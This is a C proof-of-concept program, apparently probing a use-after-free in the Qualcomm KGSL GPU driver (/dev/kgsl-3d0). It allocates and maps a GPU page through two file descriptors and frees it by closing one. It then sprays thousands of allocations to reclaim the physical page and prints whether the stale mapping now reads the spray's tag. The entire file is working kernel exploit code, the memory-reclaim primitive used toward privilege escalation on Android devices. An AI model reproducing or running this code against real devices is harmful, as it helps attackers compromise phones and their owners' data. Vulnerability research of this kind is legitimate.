#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>

#define IOCTL_GPUMEM_ALLOC 0xc018092f

struct gpumem_alloc_req {
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
};

int main() {
    int fd1 = open("/dev/kgsl-3d0", O_RDWR);
    if (fd1 < 0) { perror("open fd1"); return 1; }

    struct gpumem_alloc_req req = {0};
    req.size = 0x1000;
    if (ioctl(fd1, IOCTL_GPUMEM_ALLOC, &req) < 0) {
        perror("ioctl alloc");
        return 1;
    }
    printf("[+] Allocated UAF page at gpuaddr: 0x%lx\n", req.gpuaddr);

    int fd2 = open("/dev/kgsl-3d0", O_RDWR);
    uint64_t *ptr2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd2, req.gpuaddr);
    if (ptr2 == MAP_FAILED) { perror("mmap fd2"); return 1; }

    // Tag the memory
    ptr2[0] = 0x1122334455667788ULL;

    // Trigger UAF free
    printf("[*] Closing fd1 to free physical page...\n");
    close(fd1);
    
    // Check if it's still our tag
    if (ptr2[0] == 0x1122334455667788ULL) {
        printf("[+] Memory still readable, tag intact.\n");
    }

    // Now spray GPU memory to see if we can reclaim the very same physical page
    printf("[*] Spraying new GPU memory via a new fd...\n");
    int fd3 = open("/dev/kgsl-3d0", O_RDWR);
    for (int i = 0; i < 5000; i++) {
        struct gpumem_alloc_req spray_req = {0};
        spray_req.size = 0x1000;
        if (ioctl(fd3, IOCTL_GPUMEM_ALLOC, &spray_req) == 0) {
            uint64_t *spray_ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd3, spray_req.gpuaddr);
            if (spray_ptr != MAP_FAILED) {
                // Write a completely different tag to the new allocation
                spray_ptr[0] = 0xAABBCCDDEEFF0011ULL;
            }
        }
    }

    // Check if our original UAF pointer's content changed due to the spray!
    printf("[*] Checking UAF page content after spray...\n");
    if (ptr2[0] == 0xAABBCCDDEEFF0011ULL) {
        printf("[!!!] VULNERABILITY CONFIRMED: UAF page was reclaimed by our spray!\n");
    } else if (ptr2[0] == 0x1122334455667788ULL) {
        printf("[-] VULN FAILED: UAF page was NOT reclaimed. Content unchanged.\n");
    } else {
        printf("[?] VULN UNKNOWN: Content changed to 0x%016lx. Reclaimed by someone else?\n", ptr2[0]);
    }

    return 0;
}
